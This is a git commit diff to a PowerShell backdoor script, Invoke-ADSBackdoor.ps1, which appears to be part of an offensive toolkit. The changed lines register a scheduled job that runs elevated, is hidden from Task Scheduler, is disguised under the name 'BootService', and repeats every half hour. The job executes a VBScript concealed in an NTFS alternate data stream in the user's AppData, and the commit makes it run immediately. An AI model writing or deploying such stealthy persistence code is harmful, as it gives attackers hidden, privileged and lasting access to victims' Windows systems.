48f917e2b0f46fb5e78cc9ee46317cf762a3deca
simonpunk <simonp230446@hotmail.com>
2016-07-09 18:57:05 +0800

    Update Invoke-ADSBackdoor.ps1

--- Invoke-ADSBackdoor.ps1
+++ Invoke-ADSBackdoor.ps1
@@ -95,8 +95,8 @@ This will execute the persistence script using Invoke-Shellcode as the payload f
     else {
        $Option = New-ScheduledJobOption -RunElevated -RequireNetwork -ContinueIfGoingOnBattery -StartIfOnBattery -HideInTaskScheduler
        $Trig = New-JobTrigger -Once -At "7:00 AM" -RepeatIndefinitely -RepetitionInterval "00:30:00"
-       $Script = "{wscript.exe $env:USERPROFILE\AppData:$vbsFile}"
-       Register-ScheduledJob -Name BootService -ScriptBlock $Script -Trigger $Trig -ScheduledJobOption $Option
+       $Act = New-ScheduledTaskAction –Execute "wscript.exe" -Argument "$env:USERPROFILE\AppData:$vbsFile"
+       Register-ScheduledJob -Name BootService -Action $Act -Trigger $Trig -ScheduledJobOption $Option -RunNow
        "Process Complete."
     }
 
